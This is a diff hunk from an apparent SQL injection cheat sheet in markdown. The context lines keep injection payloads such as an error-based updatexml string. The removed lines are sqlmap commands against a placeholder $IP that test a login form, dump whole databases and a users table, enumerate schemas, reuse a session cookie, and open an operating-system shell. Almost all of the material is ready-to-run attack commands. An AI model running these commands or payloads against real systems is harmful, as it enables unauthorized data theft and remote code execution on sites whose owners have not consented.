@@ -242,48 +242,6 @@ admin'#
 ' AND updatexml(1,concat(0x7e,database()),1)--
 ```
 
-## Test POST parameter for SQL injection with sqlmap
-
-```bash
-sqlmap -u http://$IP/login.php --data "username=admin&password=pass" -p username --batch
-```
-
-## Dump entire database with sqlmap
-
-```bash
-sqlmap -u http://$IP/page.php?id=1 --dump --batch
-```
-
-## Get shell using sqlmap
-
-```bash
-sqlmap -u http://$IP/page.php?id=1 --os-shell --batch
-```
-
-## Enumerate databases with sqlmap
-
-```bash
-sqlmap -u http://$IP/page.php?id=1 --dbs --batch
-```
-
-## Enumerate tables with sqlmap
-
-```bash
-sqlmap -u http://$IP/page.php?id=1 -D database_name --tables --batch
-```
-
-## Dump specific table with sqlmap
-
-```bash
-sqlmap -u http://$IP/page.php?id=1 -D database_name -T users --dump --batch
-```
-
-## Use sqlmap with authentication cookie
-
-```bash
-sqlmap -u http://$IP/page.php?id=1 --cookie="PHPSESSID=abcd1234" --batch
-```
-
 ## Test for SQL injection in MSSQL
 
 ```
